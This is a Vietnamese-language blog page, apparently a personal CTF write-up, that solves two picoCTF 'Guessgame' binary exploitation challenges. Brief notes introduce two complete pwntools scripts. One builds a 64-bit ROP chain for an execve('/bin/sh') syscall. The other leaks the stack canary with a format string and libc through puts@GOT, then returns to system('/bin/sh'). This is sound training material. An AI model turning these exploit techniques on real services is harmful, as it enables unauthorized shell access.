<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js dark">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Guessgame - Hjn4 Blog</title>


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../../../theme/css/additional.css">

    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('dark')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="../../../homepage.html">HOME - Huy Na</a></li><li class="chapter-item affix "><li class="part-title">AWS</li><li class="chapter-item "><a href="../../../blogs/AWS/job.html">Requirements for job</a></li><li class="chapter-item "><a href="../../../blogs/AWS/extend_volume_linux.html">Attach & extend volume for linux</a></li><li class="chapter-item "><a href="../../../blogs/AWS/IAM.html">IAM</a></li><li class="chapter-item "><a href="../../../blogs/AWS/S3.html">S3</a></li><li class="chapter-item "><a href="../../../blogs/AWS/LoadBalancing-Autoscaling.html">Load balancing and autoscaling</a></li><li class="chapter-item affix "><li class="part-title">Linux</li><li class="chapter-item affix "><li class="part-title">Docker</li><li class="chapter-item "><a href="../../../blogs/Docker/tips.html">Some tips for ctf</a></li><li class="chapter-item "><a href="../../../blogs/Docker/get_started.html">Get started</a></li><li class="chapter-item affix "><li class="part-title">Bash script</li><li class="chapter-item affix "><li class="part-title">Python</li><li class="chapter-item affix "><li class="part-title">System and Network Administration</li><li class="chapter-item "><a href="../../../blogs/Network/SystemAndAdministration/session1.html">session 1</a></li><li class="chapter-item affix "><li class="part-title">PWN</li><li class="chapter-item "><a href="../../../blogs/PWN/Emporium_ROP.html">Rop Emporium</a></li><li class="chapter-item "><a href="../../../blogs/PWN/pwnableTW.html">Pwnable.tw</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pico_CTF.html">Pwn_PicoCTF</a></li><li class="chapter-item "><a href="../../../blogs/PWN/PWN_from_blabla.html">Pwn from blabla</a></li><li class="chapter-item affix "><li class="part-title">ROP Emporium</li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2win_challenge.html">ret2win - chall 1</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/split_challenge.html">split - chall 2</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/callme_challenge.html">callme - chall 3</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/write4_challenge.html">write4 - chall 4</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html">badchars - chall 5</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/pivot_challenge.html">pivot - chall 7</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2csu_challenge.html">ret2csu - chall 8</a></li><li class="chapter-item affix "><li class="part-title">Pwnable.tw</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/start_challenge.html">start</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html">orw</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/calc_challenge.html">calc</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/3x17_challenge.html">3x17</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/dubblesort_challenge.html">dubblesort</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/silver_bullet_challenge.html">silver_bullet</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/applestore_challenge.html">applestore</a></li><li class="chapter-item affix "><li class="part-title">Pwn_Pico</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/herelibc_challenge.html">Here's a libc</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/hijacking_challenge.html">hijacking</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/fermat_strins_challenge.html">fermat_strings</a></li><li class="chapter-item expanded "><a href="../../../blogs/PWN/Pwn_Pico/Guessgame_challenge.html" class="active">Guessgame</a></li><li class="chapter-item affix "><li class="part-title">Pwn from blabla</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html">handy shellcode</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/pwn07_challenge.html">pwn07 - ret2libc vs ROP</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html">GOT overwrite with format string</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/training.html">training</a></li><li class="chapter-item affix "><li class="part-title">Assembly</li><li class="chapter-item "><a href="../../../blogs/Assembly/ASM.html">ASM</a></li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_1.html">Session 1</a></li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_2.html">Session 2</a></li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_3.html">Session 3</a></li><li class="chapter-item affix "><li class="part-title">RE_PicoCTF</li><li class="chapter-item "><a href="../../../blogs/RE/RE.html">RE</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_0.html">ARMssembly 0</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_1.html">ARMssembly 1</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_2.html">ARMssembly 2</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Hjn4 Blog</h1>

                    <div class="right-buttons">

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="guessgame"><a class="header" href="#guessgame">Guessgame</a></h1>
<ul>
<li><a href="#guessgame1">Guessgame1</a></li>
<li><a href="#guessgame2">Guessgame2</a></li>
</ul>
<h2 id="guessgame1"><a class="header" href="#guessgame1">guessgame1</a></h2>
<p>Bài này hay ở chỗ là rand(), luôn cho giá trị giống nhau ở mỗi lần chạy nên là ta có thể dàng tính ra được key bằng cách chạy thử code </p>
<p>Thêm nữa, bài này nhắc ta nhớ lại cách gọi shell với ROP ở kiến trúc 64-bit</p>
<ul>
<li>Cần gadgets để ghi được chuỗi <em>/bin/sh</em> vào 1 địa chỉ cụ thể</li>
<li>pop địa chỉ đấy vào rdi, rsi = rdx = 0</li>
<li>rax = 0x3b</li>
<li>syscall for 64bit</li>
</ul>
<pre><code class="language-python">from pwn import *

binary = context.binary =ELF(&quot;./vuln&quot;)


if args.REMOTE:
    r = remote(&quot;jupiter.challenges.picoctf.org&quot;, 26735)
else:
    r = process([binary.path])
    gdb.attach(r, api=True)

payload = b&quot;&quot;

'''
0x0000000000400696 : pop rdi ; ret
0x0000000000410ca3 : pop rsi ; ret
0x000000000044cc26 : pop rdx ; ret
0x0000000000436393 : mov qword ptr [rdi], rdx ; ret
0x000000000047ff91 : mov qword ptr [rsi], rax ; ret
0x000000000044cc26 : pop rdx ; ret
0x000000000040137c : syscall
0x0000000000400416 : ret
0x00000000004163f4 : pop rax ; ret
0x0000000000445950 : xor rax, rax ; ret
'''
r.sendline(b&quot;84&quot;)
r.recv()

# payload += b&quot;a&quot;*120
# payload += p64(0x0000000000410ca3) #pop rsi
# payload += p64(0x6b7020) #addr
# payload += p64(0x00000000004163f4) #pop rax
# payload += b&quot;/bin/sh\x00&quot;
# payload += p64(0x000000000047ff91) #mov...
# payload += p64(0x000000000044cc26) #pop rdx
# payload += p64(0)
# payload += p64(0x0000000000410ca3) #pop rsi
# payload += p64(0)
# payload += p64(0x00000000004163f4) #pop rax
# payload += p64(0x3b)
# payload += p64(0x0000000000400696) #pop rdi
# payload += p64(0x6b7020) #addr
# payload += p64(0x0000000000400416) #ret
# payload += p64(0x000000000040137c) #syscall

payload += b&quot;a&quot;*120
payload += p64(0x0000000000400696) #pop rdi
payload += p64(0x6b7020) #addr
payload += p64(0x000000000044cc26) #pop rdx
payload += b&quot;/bin/sh\x00&quot;
payload += p64(0x0000000000436393) #mov...
payload += p64(0x000000000044cc26) #pop rdx
payload += p64(0)
payload += p64(0x0000000000410ca3) #pop rsi
payload += p64(0)
payload += p64(0x00000000004163f4) #pop rax
payload += p64(0x3b)
payload += p64(0x0000000000400416) #ret
payload += p64(0x000000000040137c) #syscall

r.sendline(payload)
r.interactive()

</code></pre>
<h2 id="guessgame2"><a class="header" href="#guessgame2">guessgame2</a></h2>
<p>Bài này cũng không khó với leak libc, tuy nhiên thì cho ta thêm cái hay là đọc kĩ source code tí để biết là key lúc này được tính base on address of rand funct, chứ không phải rand().</p>
<p>Oke thêm nữa là trên 1 máy thì giá trị addr funct không đổi. Và 1 lý do nữa là k biết sao mà k bf từ -4096 đến 4096 luôn đc mà cứ bị ngắt quãng nhỏ cỡ 300 là dừng, nên phải làm từ từ, may ngay lần 2 đã bf ra được key để bypass vào win.</p>
<p>Từ h thì mỗi thứ so ez, và bài này cũng nhắc mình nhớ 1 vấn đề là call đến puts_plt với tham số puts_got =&gt; leak libc</p>
<p>Nó gợi thêm 1 kĩ năng nữa là tìm kiếm libc, thì mình dùng <a href="https://libc.rip/">tool</a></p>
<p>yah, we done!!!</p>
<pre><code class="language-python">from pwn import *

binary = context.binary = ELF(&quot;./vuln&quot;)
libc = ELF(&quot;/usr/lib/i386-linux-gnu/libc.so.6&quot;)
win = 0

if not args.REMOTE:
    r = process(binary.path)
    puts_offset =libc.sym['puts'] #0x73260
    sys_offset = libc.symbols['system']#0x48150
    binsh_offset = next(libc.search(b'/bin/sh\x00'))#0x1bd0f5
    win = -2527
else:
    r = remote('jupiter.challenges.picoctf.org', 57529)
    puts_offset =0x67560
    sys_offset = 0x3cf10
    binsh_offset = 0x17b9db
    win = -3727
    
# gdb.attach(r, api = True)
canary = 0
win_addr = 0x0804876e

#for i in range(-4096, 4096):
for i in range(-3727,4096):
    r.sendlineafter(b&quot;guess?\n&quot; , str(i))
    response = r.recvline()
    # log.info(f&quot;{i}: {response}&quot;)
    if b&quot;win&quot; in response:
        log.info(f&quot;Win key: {i}&quot;)
        win = i 
        break

    
r.sendline(b&quot;%135$p&quot;)
r.recv()
canary = int(r.recv().split(b&quot;: &quot;)[1].split(b&quot;\n&quot;)[0],16)
log.info(f&quot;Canary: {hex(canary)}&quot; )
puts_plt = binary.plt['puts']
puts_got = binary.got['puts'] 
printf_got = binary.got['printf'] 
gets_got = binary.got['gets'] 



payload = b&quot;a&quot;*512 + p32(canary) + b&quot;b&quot;*12 
payload += p32(puts_plt) + p32(win_addr) + p32(puts_got)

r.sendline(str(i))
r.sendline(payload)
r.recvuntil(b&quot;a\n\n&quot;)
puts_addr = r.recv(4)
log.info(f&quot;Puts leak addr: {hex(u32(puts_addr))}&quot;)


payload = b&quot;a&quot;*512 + p32(canary) + b&quot;b&quot;*12 
payload += p32(puts_plt) + p32(win_addr) + p32(printf_got)
r.sendline(payload)
r.recvuntil(b&quot;a\n\n&quot;)
printf_got = r.recv(4)
log.info(f&quot;Printf leak addr: {hex(u32(printf_got))}&quot;)


payload = b&quot;a&quot;*512 + p32(canary) + b&quot;b&quot;*12 
payload += p32(puts_plt) + p32(win_addr) + p32(gets_got)
r.sendline(payload)
r.recvuntil(b&quot;a\n\n&quot;)
gets_got = r.recv(4)
log.info(f&quot;gets leak addr: {hex(u32(gets_got))}&quot;)


libc_addr = u32(puts_addr) - puts_offset
sys_addr = libc_addr + sys_offset
binsh_addr = libc_addr + binsh_offset

log.info(f&quot;Libc addr: {hex(libc_addr)}&quot;)
payload = b&quot;a&quot;*512 + p32(canary) + b&quot;b&quot;*12 
payload += p32(sys_addr) + p32(win_addr) + p32(binsh_addr)
r.sendline(payload)


r.interactive()


</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../blogs/PWN/Pwn_Pico/fermat_strins_challenge.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next" href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../blogs/PWN/Pwn_Pico/fermat_strins_challenge.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next" href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
